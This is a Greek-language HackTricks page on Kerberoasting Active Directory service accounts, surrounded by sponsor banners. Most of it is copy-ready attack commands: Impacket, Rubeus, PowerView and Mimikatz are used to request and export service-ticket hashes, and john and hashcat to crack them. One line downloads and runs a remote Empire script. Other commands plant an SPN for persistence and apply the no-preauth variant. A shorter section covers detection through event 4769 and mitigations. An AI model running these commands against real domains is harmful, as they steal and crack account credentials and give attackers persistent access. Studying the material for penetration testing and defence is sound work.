# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να αυτοματοποιήσετε εργασιακές διαδικασίες με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε μορφή PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Kerberoast

Η τεχνική Kerberoast επικεντρώνεται στην απόκτηση **εισιτηρίων TGS**, ειδικότερα αυτών που σχετίζονται με υπηρεσίες που λειτουργούν υπό **λογαριασμούς χρηστών** στο **Active Directory (AD)**, εξαιρώντας τους **λογαριασμούς υπολογιστών**. Η κρυπτογράφηση αυτών των εισιτηρίων χρησιμοποιεί κλειδιά που προέρχονται από **κωδικούς πρόσβασης των χρηστών**, επιτρέποντας τη δυνατότητα **αποκωδικοποίησης των διαπιστευτηρίων εκτός σύνδεσης**. Η χρήση ενός λογαριασμού χρήστη ως υπηρεσία υποδεικνύεται από μια μη κενή ιδιότητα **"ServicePrincipalName"**.

Για την εκτέλεση της τεχνικής **Kerberoast**, είναι απαραίτητο ένα λογαριασμό τομέα που μπορεί να ζητήσει **εισιτήρια TGS**, χωρίς ωστόσο να απαιτείται **ειδικά δικαιώματα**, καθιστώντας την προσβάσιμη σε οποιονδήποτε διαθέτει **έγκυρα διαπιστευτήρια τομέα**.

### Βασικά Σημεία:
- Η τεχνική **Kerberoast** στοχεύει σε **εισιτήρια TGS** για **υπηρεσίες υπό λογαριασμούς χρηστών** στο **AD**.
- Τα εισιτήρια που κρυπτογραφούνται με κλειδιά από **κωδικούς πρόσβασης των χρηστών** μπορούν να **αποκωδικοποιηθούν εκτός σύνδεσης**.
- Μια υπηρεσία αναγνωρίζεται από ένα μη κενό **ServicePrincipalName**.
- Δεν απαιτούνται **ειδικά δικαιώματα**, αρκούν **έγκυρα διαπιστευτήρια τομέα**.

### **Επίθεση**

{% hint style="warning" %}
Τα εργαλεία **Kerberoasting** συνήθως ζητούν **κρυπτογράφηση RC4** κατά την εκτέλεση της επίθεσης και την εκκίνηση αιτημάτων TGS-REQ. Αυτό συμβαίνει επειδή το **RC4 είναι** [**ασθενέστερο**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) και ευκολότερο να αποκωδικοποιηθεί εκτός σύνδεσης χρησιμοποιώντας εργαλεία όπως το Hashcat από άλλους αλγορίθμους κρυπτογράφησης, όπως το AES-128 και το AES-256.\
Οι κατακερματισμοί RC4 (τύπου 23) ξεκινούν με **`$krb5tgs$23$*`**, ενώ οι κατακερματισμοί AES-256 (τύπου 18) ξεκινούν με **`$krb5tgs$18$*`**.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Πολυλειτουργικά εργαλεία που περιλαμβάνουν ένα dump των χρηστών που μπορούν να υποστούν επίθεση kerberoasting:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Απαριθμήστε τους χρήστες που μπορούν να υποστούν Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Τεχνική 1: Ζητήστε το TGS και αντιγράψτε το από τη μνήμη**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Τεχνική 2: Αυτόματα εργαλεία**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Όταν ζητείται ένα TGS, δημιουργείται το γεγονός των Windows `4769 - Ζητήθηκε ένα εισιτήριο υπηρεσίας Kerberos`.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να αυτοματοποιήσετε ροές εργασίας με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Αποκωδικοποίηση
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Μόνιμη παρουσία

Εάν έχετε **επαρκή δικαιώματα** σε έναν χρήστη, μπορείτε να τον καταστήσετε **ευάλωτο στην επίθεση kerberoasting**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Μπορείτε να βρείτε χρήσιμα **εργαλεία** για επιθέσεις **kerberoast** εδώ: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Εάν αντιμετωπίζετε αυτό το **σφάλμα** από το Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Μεγάλη απόκλιση ρολογιού)`**, οφείλεται στην τοπική ώρα σας, χρειάζεται να συγχρονίσετε τον υπολογιστή με τον DC. Υπάρχουν μερικές επιλογές:

* `ntpdate <IP του DC>` - Αποσυνίσταται από το Ubuntu 16.04
* `rdate -n <IP του DC>`

### Αντιμετώπιση

Η επίθεση kerberoasting μπορεί να πραγματοποιηθεί με υψηλό βαθμό αόρατης δραστηριότητας, αν είναι εκτελέσιμη. Για να ανιχνευθεί αυτή η δραστηριότητα, πρέπει να δοθεί προσοχή στο **Security Event ID 4769**, το οποίο υποδεικνύει ότι έχει ζητηθεί ένα εισιτήριο Kerberos. Ωστόσο, λόγω της υψηλής συχνότητας αυτού του γεγονότος, πρέπει να εφαρμοστούν συγκεκριμένα φίλτρα για να απομονωθούν ύποπτες δραστηριότητες:

- Το όνομα της υπηρεσίας δεν πρέπει να είναι **krbtgt**, καθώς αυτό είναι μια φυσιολογική αίτηση.
- Τα ονόματα υπηρεσιών που τελειώνουν με **$** πρέπει να εξαιρεθούν για να μην συμπεριληφθούν οι λογαριασμοί μηχανών που χρησιμοποιούνται για υπηρεσίες.
- Οι αιτήσεις από μηχανές πρέπει να φιλτραριστούν αποκλείοντας τα ονόματα λογαριασμών μορφοποιημένα ως **machine@domain**.
- Πρέπει να ληφθούν υπόψη μόνο οι επιτυχημένες αιτήσεις εισιτηρίων, που αναγνωρίζονται από έναν κωδικό αποτυχίας **'0x0'**.
- **Το πιο σημαντικό**, ο τύπος κρυπτογράφησης του εισιτηρίου πρέπει να είναι **0x17**, που συχνά χρησιμοποιείται σε επιθέσεις kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Για να μειωθεί ο κίνδυνος του Kerberoasting:

- Βεβαιωθείτε ότι οι **κωδικοί πρόσβασης των λογαριασμών υπηρεσίας είναι δύσκολοι να μαντευτούν**, συνιστώντας μήκος πάνω από **25 χαρακτήρες**.
- Χρησιμοποιήστε **Διαχειριζόμενους Λογαριασμούς Υπηρεσίας**, οι οποίοι προσφέρουν οφέλη όπως **αυτόματη αλλαγή κωδικού πρόσβασης** και **ανάθεση διαχείρισης του Service Principal Name (SPN)**, ενισχύοντας την ασφάλεια απέναντι σε τέτοιου είδους επιθέσεις.

Με την εφαρμογή αυτών των μέτρων, οι οργανισμοί μπορούν να μειώσουν σημαντικά τον κίνδυνο που συνδέεται με το Kerberoasting.


## Kerberoast χωρίς λογαριασμό τομέα

Τον **Σεπτέμβριο του 2022**, ένας νέος τρόπος εκμετάλλευσης ενός συστήματος αποκαλύφθηκε από έναν ερευνητή με το όνομα Charlie Clark, ο οποίος το μοιράστηκε μέσω της πλατφόρμας του [exploit.ph](https://exploit.ph/). Αυτή η μέθοδος επιτρέπει την απόκτηση **Εισιτηρίων Υπηρεσίας (ST)** μέσω ενός αιτήματος **KRB_AS_REQ**, το οποίο δεν απαιτεί τον έλεγχο ενός λογαριασμού Active Directory. Ουσιαστικά, αν ένας πρωταρχικός λογαριασμός έχει ρυθμιστεί έτσι ώστε να μην απαιτεί προελεγμένη πιστοποίηση - μια κατάσταση παρόμοια με αυτή που είναι γνωστή στον κυβερνοασφαλτικό χώρο ως επίθεση **AS-REP Roasting** - αυτό το χαρακτηριστικό μπορεί να αξιοποιηθεί για να παραπλανηθεί η διαδικασία του αιτήματος. Συγκεκριμένα, αλλάζοντας το χαρακτηριστικό **sname** μέσα στο σώμα του αιτήματος, το σύστημα παραπλανείται να εκδώσει ένα **ST** αντί για το κανονικό κρυπτογραφημένο Ticket Granting Ticket (TGT).

Η τεχνική εξηγείται αναλυτικά σε αυτό το άρθρο: [Δημοσίευση ιστολογίου Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Πρέπει να παρέχετε μια λίστα χρηστών επειδή δεν έχουμε έγκυρο λογαριασμό για να ερωτηθεί το LDAP χρησιμοποιώντας αυτήν την τεχνική.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py από το PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus από το PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Αναφορές
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
